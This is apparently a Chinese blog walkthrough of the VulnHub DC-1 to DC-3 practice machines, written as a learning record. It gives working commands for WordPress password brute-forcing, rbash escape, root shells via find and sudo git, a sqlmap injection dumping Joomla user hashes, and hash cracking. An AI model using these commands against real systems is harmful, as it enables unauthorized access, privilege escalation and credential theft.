<p><code>2&gt;/dev/null</code>：将标准错误输出重定向到<code>/dev/null</code>，<code>/dev/null</code>是一个特殊文件，任何写入其中的内容都会被丢弃，不会产生任何输出，防止过多报错信息干扰</p>
</blockquote>
<p>其中find比较常用，可以执行root权限的命令找查文件，可以用find提权</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="type">name</span> <span class="keyword">index</span>.php -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>找查什么文件不重要，但该文件必须要存在，然后后面加上</p>
<p>-exec “&#x2F;bin&#x2F;sh” ;的意思是启动一个新shell，此时这个shell就有root权限，因为这个shell是find命令启动的，而find又是root权限</p>
</blockquote>
<p>最后也是拿到了第五个flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a326d3cc1ff.png" alt="image-20240717003517509.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学到了基本渗透的大概流程，一些基本渗透工具的简单使用，还有find提权，整个流程比较简单</p>
<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><p>官网下载：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a></p>
<h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="探测目标IP"><a href="#探测目标IP" class="headerlink" title="探测目标IP"></a>探测目标IP</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">arp</span>-scan -l</span><br><span class="line">或</span><br><span class="line"><span class="symbol">nmap</span> -<span class="built_in">sP</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p>感觉arp扫出来的结果好看一点，得到靶机IP：192.168.111.134</p>
<h3 id="探测开放端口"><a href="#探测开放端口" class="headerlink" title="探测开放端口"></a>探测开放端口</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -<span class="selector-tag">A</span> -<span class="selector-tag">p</span>- <span class="number">192.168</span>.<span class="number">111.134</span></span><br><span class="line">或</span><br><span class="line">nmap -sV -<span class="selector-tag">p</span>- <span class="number">192.168</span>.<span class="number">111.134</span></span><br></pre></td></tr></table></figure>

<p>前者扫出来的结果更全面，后者扫的结果快一点点</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a3286a3e3b0.png" alt="image-20240717115914400.png"></p>
<p>可以看到开放了80端口http协议，还有7744端口ssh服务，ssh默认端口是22，这里应该是改了一下</p>
<h3 id="网页信息收集-1"><a href="#网页信息收集-1" class="headerlink" title="网页信息收集"></a>网页信息收集</h3><p>尝试访问下80端口的web服务，无法访问，发现直接跳到了dc-2</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a3286a924bc.png" alt="image-20240717120430379.png"></p>
<p>应该是重定向到了dc-2，在dns解析顺序中，Hosts的请求级别比DNS高，我们只需在本地hosts文件（windows系统的hosts文件路径为”C:\Windows\System32\drivers\etc\hosts”）中加入</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.111.134</span> dc-<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>这样再次访问192.168.111.134并触发重定向到<a target="_blank" rel="noopener" href="http://dc-2/%E6%97%B6%EF%BC%8C%E7%B3%BB%E7%BB%9F%E5%B0%86%E8%83%BD%E5%A4%9F%E6%AD%A3%E7%A1%AE%E8%A7%A3%E6%9E%90dc-2%E4%B8%BA192.168.111.134%EF%BC%8C%E5%B0%B1%E8%83%BD%E6%88%90%E5%8A%9F%E8%AE%BF%E9%97%AE%E4%BA%86%EF%BC%8C%E8%AE%B0%E5%BE%97%E4%B9%8B%E5%89%8D%E8%AE%BF%E9%97%AEgithub%E5%87%BA%E9%97%AE%E9%A2%98%E6%97%B6%E4%B9%9F%E6%94%B9%E8%BF%87hosts%E6%96%87%E4%BB%B6">http://dc-2/时，系统将能够正确解析dc-2为192.168.111.134，就能成功访问了，记得之前访问github出问题时也改过hosts文件</a></p>
<p>进去后右下角得到flag1</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a3286ad938e.png" alt="image-20240717152817252.png"></p>
<p>flag1</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">你的常用字典可能不起作用，所以也许你只需要变得聪明（cewl）一点。</span><br><span class="line">更多的密码总是更好，但有时候你就是无法全部猜中。</span><br><span class="line">登录其中一个账户来看下一个标志（<span class="built_in">flag</span>）。</span><br><span class="line">如果你找不到它，那就登录另一个账户试试。</span><br></pre></td></tr></table></figure>

<p>cewl是一个用于从指定的网站或页面抓取单词，生成定制的单词列表的工具。这个工具特别适用于渗透测试和密码破解场景，可以用来创建字典，用于暴力破解攻击。</p>
<p>也就是提示我们爆破账户密码，那得先搞到登录框啊，dirsearch扫一下</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dirsearch</span> -u <span class="number">192.168.111.134</span> -e * -x <span class="number">403</span> <span class="number">404</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>-e后接语言，可选php，asp，*（表示全部语言）等</p>
<p>-x表示过滤的状态码，扫描出来后不显示该状</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a3291781745.png" alt="image-20240717154554321.png"></p>
<p>有个wp-login.php就是我们登录的路由，然后就是爆破账户密码</p>
<h2 id="Web端渗透"><a href="#Web端渗透" class="headerlink" title="Web端渗透"></a>Web端渗透</h2><h3 id="生成字典"><a href="#生成字典" class="headerlink" title="生成字典"></a>生成字典</h3><p>刚说了常用字典没用，要用cewl，具体参考：<a target="_blank" rel="noopener" href="https://www.codercto.com/a/44828.html">kali密码攻击工具——Cewl使用指南</a></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http:<span class="regexp">//</span>dc-<span class="number">2</span><span class="regexp">/ -w /</span>home<span class="regexp">/kali/</span>Desktop/dict.txt                </span><br></pre></td></tr></table></figure>

<p>将爬取<a target="_blank" rel="noopener" href="http://dc-2/%E7%BD%91%E7%AB%99%E7%94%9F%E6%88%90%E7%9A%84%E5%AD%97%E5%85%B8%EF%BC%8C%E5%86%99%E5%85%A5dict.txt%E6%96%87%E4%BB%B6%E4%B8%AD">http://dc-2/网站生成的字典，写入dict.txt文件中</a></p>
<h3 id="爆破用户名"><a href="#爆破用户名" class="headerlink" title="爆破用户名"></a>爆破用户名</h3><p>这个要用到wpscan</p>
<blockquote>
<p>WordPress是全球流行的博客网站，许多外国的博客都是用它搭建的，但是存在着很多漏洞，专注于这些漏洞与其特性，一个专门针对该CMS的WPScan工具出现了</p>
</blockquote>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan <span class="comment">--url dc-2 -e u</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>-e u：这是命令中的选项参数。-e 用于指定要执行的枚举（enumeration）任务。在这里，u 表示要枚举用户（users）</p>
</blockquote>
<p>扫出来三个，admin，tom，jerry，将其保存到username.txt中</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a329177a814.png" alt="image-20240717160248271.png"></p>
<h3 id="爆破密码"><a href="#爆破密码" class="headerlink" title="爆破密码"></a>爆破密码</h3><p>然后就开爆破，密码就是刚才生成的字典</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url dc-<span class="number">2</span> -U <span class="regexp">/home/</span>kali<span class="regexp">/Desktop/u</span>sername.txt -P <span class="regexp">/home/</span>kali<span class="regexp">/Desktop/</span>dict.txt</span><br></pre></td></tr></table></figure>

<p>爆出了tom和jerry的密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a329176ca64.png" alt="image-20240717161024997.png"></p>
<p>登录jerry的账户在pages中找到flag2</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果你不能利用 WordPress 并且采取捷径，还有另一种方法。</span><br><span class="line">希望你找到了另一个入口点。</span><br></pre></td></tr></table></figure>

<p>喊我们找其他利用点</p>
<h2 id="主机端渗透"><a href="#主机端渗透" class="headerlink" title="主机端渗透"></a>主机端渗透</h2><h3 id="ssh远程登录"><a href="#ssh远程登录" class="headerlink" title="ssh远程登录"></a>ssh远程登录</h3><p>想起刚才扫端口看到7744端口开了ssh，尝试下刚才的账户密码能不能连ssh，命令格式如下</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh</span> 用户名@主机地址 -p 端口</span><br><span class="line"><span class="attribute">ssh</span> tom@<span class="number">192.168.111.134</span> -p <span class="number">7744</span></span><br></pre></td></tr></table></figure>

<p>只有tom用户连的上，当前目录下有flag3.txt，想要查看却发现rbash（下文介绍），看下能用些啥命令</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compgen -c          <span class="comment">//列出所有可用命令</span></span><br></pre></td></tr></table></figure>

<p>发现可以用vi，<code>vi flag3</code>得到</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可怜的老汤姆总是在追着杰瑞跑，也许他应该因为杰瑞给他造成的所有压力而起诉他。</span><br></pre></td></tr></table></figure>

<h3 id="rbash逃逸（linux提权）"><a href="#rbash逃逸（linux提权）" class="headerlink" title="rbash逃逸（linux提权）"></a>rbash逃逸（linux提权）</h3><ul>
<li>RBASH 是 Restricted BASH 的缩写，意思是受限制的 BASH。</li>
<li>RBASH 是一种特殊的 shell，它限制了用户的一些操作和权限，例如：<ul>
<li>不能使用 cd 命令来改变当前目录。</li>
<li>不能使用 set 命令来改变环境变量或 shell 选项。</li>
<li>不能使用 unset 命令来取消环境变量或 shell 函数。</li>
<li>不能使用任何包含 &#x2F; 符号的命令，除非它们在 PATH 环境变量中指定了。</li>
<li>不能重定向输入或输出，例如使用 &gt;, &lt;, &gt;&gt;, &lt;&lt; 等符号。</li>
<li>只能执行 PATH 环境变量中指定的命令，而且 PATH 环境变量通常只包含一些基本的命令，例如 ls, cat, echo 等。</li>
</ul>
</li>
<li>RBASH 的目的是为了提高系统的安全性，防止用户执行一些危险或不合法的操作。</li>
</ul>
<p>说了只能执行 PATH 环境变量中指定的命令，我们看看能用些啥命令</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="variable">$PATH</span>                   <span class="regexp">//</span>查看PATH环境变量的值</span><br><span class="line">echo <span class="regexp">/home/</span>tom<span class="regexp">/usr/</span>bin<span class="regexp">/*     /</span>/查看上面得到PATH路径的所有文件</span><br></pre></td></tr></table></figure>

<p>有四个命令能用less，ls，scp，vi，rbash逃逸手法见文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43168364/article/details/111830233">rbash逃逸方法总结</a>或<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7642?time__1311=n4+xnD0DyDuDgDfxGqP05fbWDOYkmeeqxuIrID">rbash逃逸大全</a></p>
<p>第二篇文章中提到scp也能提权，这个好像很少，遇到再说吧</p>
<h4 id="vi设置shell提权"><a href="#vi设置shell提权" class="headerlink" title="vi设置shell提权"></a>vi设置shell提权</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vi</span>                                    //进入<span class="keyword">vi</span>编辑器</span><br><span class="line">:<span class="keyword">set</span> <span class="keyword">shell</span>=/bin/bash                  //设置<span class="keyword">vi</span>使用的外部<span class="keyword">shell</span>为/bin/bash</span><br><span class="line">:<span class="keyword">shell</span>                                //暂时退出<span class="keyword">vi</span>进入一个新的<span class="keyword">shell</span>会话,结束该会话后返回<span class="keyword">vi</span></span><br></pre></td></tr></table></figure>

<p>此时执行命令发现已经变成了bash</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a329188ca96.png" alt="image-20240718134144587.png"></p>
<p>没找到cat命令，我们需要将命令加到环境变量中</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export <span class="title class_">PATH</span>=<span class="variable">$PATH</span><span class="symbol">:/bin/</span>                              </span><br><span class="line">export <span class="title class_">PATH</span>=<span class="variable">$PATH</span><span class="symbol">:/usr/bin/</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>以上两个命令增加了可执行文件的查找目录，使得系统能够在 <code>/bin/</code> 和 <code>/usr/bin/</code> 中找到并执行相应的命令</p>
</blockquote>
<h4 id="BASH-CMDS设置shell"><a href="#BASH-CMDS设置shell" class="headerlink" title="BASH_CMDS设置shell"></a>BASH_CMDS设置shell</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[x]=<span class="regexp">/bin/</span>bash            <span class="regexp">//</span>将BASH_CMDS数组的元素x设为<span class="regexp">/bin/</span>bash</span><br><span class="line">x                                 <span class="regexp">//</span>相当于执行<span class="regexp">/bin/</span>bash</span><br></pre></td></tr></table></figure>

<p>设置完shell也是要将命令加入环境变量中</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export <span class="title class_">PATH</span>=<span class="variable">$PATH</span><span class="symbol">:/bin/</span>                              </span><br><span class="line">export <span class="title class_">PATH</span>=<span class="variable">$PATH</span><span class="symbol">:/usr/bin/</span></span><br></pre></td></tr></table></figure>

<p>回顾一下flag3的原文</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Poor <span class="built_in">old</span> Tom <span class="keyword">is</span> <span class="keyword">always</span> running <span class="keyword">after</span> Jerry. Perhaps he should su <span class="keyword">for</span> <span class="keyword">all</span> the stress he causes.</span><br></pre></td></tr></table></figure>

<p>提到了su，su是Linux切换用户的命令</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">su</span> jerry               <span class="comment">//切换到jerry的账户</span></span><br></pre></td></tr></table></figure>

<p>用之前得到的密码就可以进</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -<span class="built_in">name</span> *<span class="built_in">flag</span>*               <span class="comment">//查找所有文件名中含flag的文件</span></span><br><span class="line">cat /home/jerry/flag4.txt</span><br></pre></td></tr></table></figure>

<p>flag4</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Good to see that yo<span class="string">u&#x27;ve made it this far - but you&#x27;</span>re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - yo<span class="string">u&#x27;re on your own now.  :-)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Go on - git outta here!!!!</span></span><br></pre></td></tr></table></figure>

<p>最后一句提到git，暗示我们要git提权</p>
<h3 id="git提权"><a href="#git提权" class="headerlink" title="git提权"></a>git提权</h3><p>虽然暗示说git提权，但我们也可以试试suid提权</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>-user root</code>：限制搜索结果只包含属于用户 <code>root</code> 的文件</p>
<p><code>-perm -4000</code>：查找设置了 Set-UID 位的文件，在八进制权限表示法中，Set-UID 位对应于 4000</p>
</blockquote>
<p>结果是没用能用的，那就按暗示说的git提权</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l                                  <span class="comment">//查看哪些命令能sudo执行</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32917858f8.png" alt="image-20240718143027327.png"></p>
<p>git能用root权限，还不用密码，这里演示两种git提权的方式</p>
<p>法一</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git <span class="keyword">help</span> config                 <span class="string">//</span>查看git配置命令的帮助文档</span><br><span class="line">!<span class="string">/bin/bash</span>                           <span class="string">//</span>打开一个用户为root的shell,bash可换成sh</span><br></pre></td></tr></table></figure>

<p>法二</p>
<p>命令前要把shell窗口调窄一点，防止直接显示完就退出了</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p <span class="keyword">help</span>                      <span class="string">//</span>用分页器查看git帮助文档</span><br><span class="line">!<span class="string">/bin/bash</span>                            <span class="string">//bash</span>可换成sh</span><br></pre></td></tr></table></figure>

<p>最终到root目录拿到flag5</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a329176ca29.png" alt="image-20240718144821029.png"></p>
<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>又学到了一些新东西，用cewl和wpscan爆破wordpress账户密码进行web服务的渗透，ssh之前也学过算是复习了一下，rbash逃逸部分手法，git提权，提权的手法好多，慢慢学吧</p>
<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><p>官网下载：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-3-2.zip">https://download.vulnhub.com/dc/DC-3-2.zip</a></p>
<p>如果报错：IDE 设备 (磁盘&#x2F;CD-ROM)配置不正确。“ide0:1”上具有一个 IDE 从设备，但没有主设备。此配置在虚拟机中无法正常运行。请使用配置编辑器将磁盘&#x2F;CD-ROM 从“ide0:1”移到“ide0:0”。</p>
<p>我的解决办法是设置-&gt;选择”CD&#x2F;DVD(IDE)”-&gt;点”高级”-&gt;将IDE设置为它要求的值</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32a62c55eb.png" alt="image-20240718153434604.png"></p>
<h2 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -<span class="selector-tag">A</span> -<span class="selector-tag">p</span>- <span class="number">192.168</span>.<span class="number">111.135</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32a63abfa4.png" alt="image-20240718154652793.png"></p>
<p>80端口的web服务开着，访问一下没啥东西，扫下目录</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dirsearch</span> -u <span class="number">192.168.111.135</span></span><br></pre></td></tr></table></figure>

<p>还是扫出来一些东西</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32a62cfc9b.png" alt="image-20240718160408523.png"></p>
<p>访问<code>/administrator/index.php</code>，看名字感觉像是管理员后台登录的地方，cms是joomla</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32a62bfdaf.png" alt="image-20240718160529201.png"></p>
<h2 id="漏洞查找"><a href="#漏洞查找" class="headerlink" title="漏洞查找"></a>漏洞查找</h2><h3 id="joomscan"><a href="#joomscan" class="headerlink" title="joomscan"></a>joomscan</h3><p>joomscan是一款开源的且针对joomla的扫描器</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt <span class="keyword">install </span><span class="keyword">joomscan </span>                           </span><br><span class="line"><span class="keyword">joomscan </span>-u <span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">135</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32a62bde19.png" alt="image-20240718161110867.png"></p>
<p>给了版本还有些路由，路由没啥用，之前dirsearch都扫出来了</p>
<h3 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h3><p>searchsploit是一款kali自带的搜索漏洞信息的模块，具体详细用法参考文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/102806149">searchsploit漏洞查找工具使用指南</a></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">searchsploit</span> joomla <span class="number">3</span>.<span class="number">7</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32a63eb9fb.png" alt="image-20240718161641081.png"></p>
<p>有个sql注入，还有个跨站扫描漏洞，还有漏洞详情，看一下</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">42033</span>.txt </span><br></pre></td></tr></table></figure>

<p>给出了利用点和sqlmap的用法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32a6396437.png" alt="image-20240718162017791.png"></p>
<p>sql注入具体原理见文章：<a target="_blank" rel="noopener" href="https://paper.seebug.org/305/#0x03">https://paper.seebug.org/305/#0x03</a></p>
<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>直接用sqlmap梭</p>
<p>爆库名</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;<span class="link">http://192.168.111.135/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --batch</span><br></pre></td></tr></table></figure>

<blockquote>
<p>加了个–batch，这个参数是以无人值守模式运行，不会提示用户输入任何内容，自动选择默认选项</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32a62af96f.png" alt="image-20240718163726444.png"></p>
<p>爆joomladb库表名</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;<span class="link">http://192.168.111.135/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --batch -D joomladb --tables</span><br></pre></td></tr></table></figure>

<blockquote>
<p>-D 指定数据库，当数据库名含有特殊符号的时候，需要用引号包括起来</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32a62c144f.png" alt="image-20240718163840520.png"></p>
<p>爆users表的列名</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;<span class="link">http://192.168.111.135/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -T &quot;#__users&quot; --columns</span><br></pre></td></tr></table></figure>

<blockquote>
<p>要注意这里就不能用–batch参数，因为这样刚开始会默认使用公共参数爆破而选择N，导致注入失败，根据提示，手工输入y并回车即可</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32a628bb55.png" alt="image-20240718165555043.png"></p>
<p>爆列的值</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;<span class="link">http://192.168.111.135/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -T &quot;#__users&quot; -C username,password --dump</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32a66288b9.png" alt="image-20240718165732791.png"></p>
<p>这个密码这么复杂，肯定加密过</p>
<h3 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h3><p>用到John工具，John the Ripper (“JtR”) 是一个非常有用的工具。这是一个快速的密码破解，适用于Windows和许多Linux系统。它具有很多功能，对于很多密码破解均有奇效。<a target="_blank" rel="noopener" href="https://blog.csdn.net/blue_starry_sky/article/details/61206488">John介绍及常用命令使用说明</a></p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&#x27;<span class="subst">$2y</span><span class="subst">$10</span><span class="subst">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span>&#x27;</span> &gt; test     <span class="comment">//把加密后的密码写入文件</span></span><br><span class="line">john test</span><br><span class="line">john test --<span class="keyword">show</span>       <span class="comment">//显示已破解的密码</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32a648a69c.png" alt="image-20240718170126699.png"></p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>找到个文件上传的地方，可以写马也可以反弹shell，我这里用php弹的shell</p>
